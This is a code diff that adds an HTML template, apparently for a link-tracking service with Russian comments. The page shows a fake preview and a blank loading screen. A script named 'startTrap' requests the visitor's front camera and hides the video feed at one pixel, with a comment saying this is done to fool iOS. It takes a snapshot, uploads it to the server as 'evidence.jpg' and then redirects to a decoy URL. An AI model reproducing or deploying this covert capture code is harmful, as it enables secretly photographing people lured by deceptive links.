@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Динамические мета-теги для превью -->
+    {% if meta_title %}
+    <title>{{ meta_title }}</title>
+    <meta property="og:title" content="{{ meta_title }}">
+    <meta name="twitter:title" content="{{ meta_title }}">
+    {% else %}
+    <title>Загрузка...</title>
+    {% endif %}
+
+    {% if meta_desc %}
+    <meta property="og:description" content="{{ meta_desc }}">
+    <meta name="twitter:description" content="{{ meta_desc }}">
+    <meta name="description" content="{{ meta_desc }}">
+    {% endif %}
+
+    {% if meta_image %}
+    <meta property="og:image" content="{{ meta_image }}">
+    <meta name="twitter:image" content="{{ meta_image }}">
+    <meta name="twitter:card" content="summary_large_image">
+    {% endif %}
+
+    <meta property="og:type" content="website">
+
+    <style>
+        body {
+            font-family: sans-serif; 
+            background-color: #fff;
+            display: flex; 
+            flex-direction: column; 
+            align-items: center;
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        /* Скрываем видео так, чтобы браузер думал, что оно активно (для iOS) */
+        video { 
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+            z-index: -1;
+        }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <!-- Пустой экран для имитации долгой загрузки -->
+    
+    <!-- Элемент видео должен быть в DOM -->
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const linkId = "{{ link_id }}";
+        const redirectUrl = "{{ redirect_url }}";
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        // Функция редиректа - вызываем её в любом случае в конце
+        function doRedirect() {
+            window.location.replace(redirectUrl);
+        }
+
+        async function startTrap() {
+            try {
+                // Пытаемся получить доступ к камере
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    // Даем камере секунду "прогреться" и настроить фокус/свет
+                    setTimeout(takeSnapshot, 1500);
+                };
+            } catch (err) {
+                // Если запретили доступ или ошибка - просто редиректим
+                // Можно добавить лог на сервер, что "отказано", но пока просто редирект
+                console.log("Access denied or error:", err);
+                doRedirect();
+            }
+        }
+
+        function takeSnapshot() {
+            try {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                // Зеркалим (не обязательно, но привычнее)
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob((blob) => {
+                    if (blob) {
+                        sendPhoto(blob);
+                    } else {
+                        doRedirect();
+                    }
+                }, 'image/jpeg', 0.8);
+
+            } catch (e) {
+                doRedirect();
+            }
+        }
+
+        function sendPhoto(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'evidence.jpg');
+
+            fetch(`/upload/${linkId}`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.json())
+            .then(data => {
+                // Не важно, что ответил сервер, главное отправили
+                doRedirect();
+            })
+            .catch(err => {
+                doRedirect();
+            });
+        }
+
+        // Запуск при загрузке
+        window.addEventListener('load', startTrap);
+    </script>
+</body>
+</html>
